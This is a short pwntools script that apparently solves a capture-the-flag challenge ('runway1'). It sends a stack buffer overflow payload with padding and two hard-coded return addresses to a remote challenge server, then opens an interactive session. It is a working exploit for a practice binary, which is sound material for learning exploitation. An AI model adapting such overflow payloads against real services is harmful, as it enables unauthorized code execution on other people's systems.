from pwn import *

#io = process("./runway1")
io = remote("challs.pwnoh.io", 13401)

payload = b"A"*72 + p32(0x0804900e) + p32(0x080491e6)

a = io.recvuntil("food?\n")
print(a)
io.sendline(payload)

io.interactive()

